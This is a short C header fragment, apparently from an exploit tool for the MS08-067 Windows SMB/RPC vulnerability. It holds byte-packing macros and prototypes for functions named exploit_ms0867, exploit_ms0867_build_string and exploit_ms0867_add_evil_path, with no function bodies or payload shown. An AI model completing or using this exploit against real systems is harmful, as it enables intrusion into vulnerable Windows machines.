#define MAGIC_SIZE 0x5C

#define ADD_UINT32(ptr, val) do {\
        u_int32_t value = val;\
        memcpy(ptr, &value, sizeof(u_int32_t));\
        ptr += sizeof(u_int32_t);\
} while (0)

#define ADD_UINT16(ptr, val) do {\
        u_int16_t value = val;\
        memcpy(ptr, &value, sizeof(u_int16_t));\
        ptr += sizeof(u_int16_t);\
} while (0)

#define ADD_UINT8(ptr, val) do {\
        u_int8_t value = val;\
        memcpy(ptr, &value, sizeof(u_int8_t));\
        ptr += sizeof(u_int8_t);\
} while (0)

#define ADD_STRING(ptr, string) do {\
        int i = 0;\
        for (i = 0; i < strlen(string); i++) {\
                *ptr = string[i];\
                ptr++;\
                *ptr = '\0';\
                ptr++;\
        }\
} while (0)

int exploit_ms0867(struct SMB_session *session);
size_t exploit_ms0867_build_string(u_int8_t *rpc_data);
void exploit_ms0867_add_evil_path(u_int8_t *data);

